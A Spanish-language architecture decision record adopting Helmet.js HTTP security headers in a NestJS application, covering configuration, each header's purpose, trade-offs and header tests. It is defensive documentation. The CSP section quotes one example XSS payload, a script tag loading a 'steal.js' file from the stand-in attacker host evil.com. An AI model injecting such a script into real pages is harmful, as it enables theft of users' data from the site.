# ADR-015: Middleware de Seguridad Helmet

**Estado:** Aceptado  
**Fecha:** 2024-01-17  
**Autor:** Equipo de Desarrollo  
**ADRs Relacionados:** ADR-005 (Framework NestJS)

---

## Contexto

Las aplicaciones web son vulnerables a ataques comunes como **XSS, Clickjacking, MIME sniffing y ataques de degradación de protocolo**. Los headers de seguridad HTTP proporcionan **defensa en profundidad** al instruir a los navegadores sobre cómo manejar el contenido de forma segura.

### Problema

**Sin Headers de Seguridad:**

```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>...</html>
```

**Riesgos:**

- ❌ **Ataques XSS:** Scripts maliciosos pueden ejecutarse
- ❌ **Clickjacking:** El sitio puede ser embebido en iframes
- ❌ **MIME Sniffing:** El navegador ejecuta tipos de contenido inesperados
- ❌ **Degradación de Protocolo:** HTTPS → HTTP degradación posible

---

## Decisión

Usar **middleware Helmet.js** para configurar automáticamente headers HTTP seguros:

```typescript
/**
 * main.ts
 * Ubicación: src/main.ts
 */
import helmet from 'helmet';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // ✅ Aplicar middleware Helmet
  if (configService.get<boolean>('app.security.helmet.enabled', true)) {
    app.use(
      helmet({
        crossOriginEmbedderPolicy: false, // Permitir embedding de assets
        contentSecurityPolicy:
          environment === 'production'
            ? undefined // Habilitar CSP en producción
            : false, // Deshabilitar CSP en desarrollo (Swagger lo necesita)
      }),
    );
  }

  await app.listen(3000);
}
```

**Configuración:**

```typescript
// src/config/app.config.ts
export const appConfig = registerAs('app', () => ({
  security: {
    helmet: {
      enabled: process.env['HELMET_ENABLED'] !== 'false', // Habilitado por defecto
    },
  },
}));
```

---

## Headers de Seguridad Aplicados

### 1. X-Content-Type-Options: nosniff

```http
X-Content-Type-Options: nosniff
```

**Previene:** MIME type sniffing (el navegador respeta el header Content-Type)  
**Ataque de Ejemplo:** El servidor envía `image.jpg` (en realidad contiene JS), el navegador lo ejecuta  
**Solución Helmet:** El navegador no ejecutará, lanzará error en su lugar

### 2. X-Frame-Options: SAMEORIGIN

```http
X-Frame-Options: SAMEORIGIN
```

**Previene:** Ataques de clickjacking (sitio embebido en iframe malicioso)  
**Ataque de Ejemplo:** El atacante embebe un sitio bancario en un iframe, superpone una UI falsa  
**Solución Helmet:** Solo permite embedding desde el mismo origen

### 3. Strict-Transport-Security (HSTS)

```http
Strict-Transport-Security: max-age=15552000; includeSubDomains
```

**Previene:** Ataques de degradación de protocolo (HTTPS → HTTP)  
**Ataque de Ejemplo:** Man-in-the-middle degrada la conexión a HTTP  
**Solución Helmet:** El navegador fuerza HTTPS durante 180 días

### 4. X-Download-Options: noopen

```http
X-Download-Options: noopen
```

**Previene:** IE8+ abriendo automáticamente descargas en contexto del navegador  
**Ataque de Ejemplo:** Descargar archivo HTML, IE ejecuta scripts en contexto del sitio  
**Solución Helmet:** Fuerza "Guardar Como" en lugar de "Abrir"

### 5. X-Permitted-Cross-Domain-Policies: none

```http
X-Permitted-Cross-Domain-Policies: none
```

**Previene:** Carga de datos cross-domain de Flash/PDF  
**Solución Helmet:** No permite políticas cross-domain

### 6. Referrer-Policy: no-referrer

```http
Referrer-Policy: no-referrer
```

**Previene:** Filtración de datos sensibles vía header Referer  
**Ejemplo:** Usuario visita `https://site.com/orders/12345?token=secret`  
Luego hace clic en enlace externo → ¡Referer expone el token!  
**Solución Helmet:** No se envía Referer a sitios externos

### 7. Content-Security-Policy (CSP) - Solo Producción

```http
Content-Security-Policy: default-src 'self'
```

**Previene:** Ataques XSS (restringe la carga de recursos)  
**Ejemplo:** Atacante inyecta `<script src="evil.com/steal.js"></script>`  
**Solución Helmet:** El navegador bloquea scripts de dominios no confiables

**Por qué Deshabilitado en Dev:** Swagger UI necesita scripts inline, CSP los bloquea

---

## Implementación

**Configuración:**

```typescript
// .env
HELMET_ENABLED = true; // Producción: true, Dev: false (opcional)

// docker-compose.yml (dev)
HELMET_ENABLED = false; // Deshabilitar para desarrollo local (compatibilidad con Swagger)
```

**Habilitación Condicional:**

```typescript
// Helmet habilitado por defecto, puede deshabilitarse vía variable de entorno
if (configService.get<boolean>('app.security.helmet.enabled', true)) {
  app.use(
    helmet({
      /* ... */
    }),
  );
}
```

---

## Beneficios

✅ **Configuración Cero:** Funciona out-of-box con defaults sensatos  
✅ **Múltiples Headers:** Configura 11+ headers de seguridad automáticamente  
✅ **Soporte de Navegadores:** Funciona en todos los navegadores modernos  
✅ **Rendimiento:** Overhead negligible (<0.1ms por request)  
✅ **Cumplimiento:** Ayuda a cumplir estándares de seguridad (OWASP, PCI-DSS)

---

## Trade-offs

**1. CSP Rompe Swagger en Desarrollo**

```
Problema: Swagger UI usa scripts inline, CSP los bloquea
Solución: Deshabilitar CSP en desarrollo, habilitar en producción
```

**2. X-Frame-Options Rompe Embedding**

```
Problema: No se puede embeber el sitio en iframe (incluso casos legítimos)
Solución: Usar directiva frame-ancestors de CSP para control granular
```

---

## Pruebas

```bash
# Verificar headers
curl -I http://localhost:3000/api/v1/health

HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
```

**Test Automatizado:**

```typescript
it('should include security headers', async () => {
  const response = await request(app.getHttpServer()).get('/api/v1/health').expect(200);

  expect(response.headers['x-content-type-options']).toBe('nosniff');
  expect(response.headers['x-frame-options']).toBe('SAMEORIGIN');
  expect(response.headers['strict-transport-security']).toContain('max-age');
});
```

---

## Referencias

- [Helmet.js Documentation](https://helmetjs.github.io/)
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN HTTP Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

---

## Ubicaciones de Código

```
src/main.ts                 - Configuración de middleware Helmet
src/config/app.config.ts    - Configuración de Helmet
.env.example                - Variable HELMET_ENABLED
```

---

**Estado:** ✅ **IMPLEMENTADO Y OPERACIONAL**  
**Última Actualización:** 2024-01-17  
**Autor:** Equipo de Desarrollo
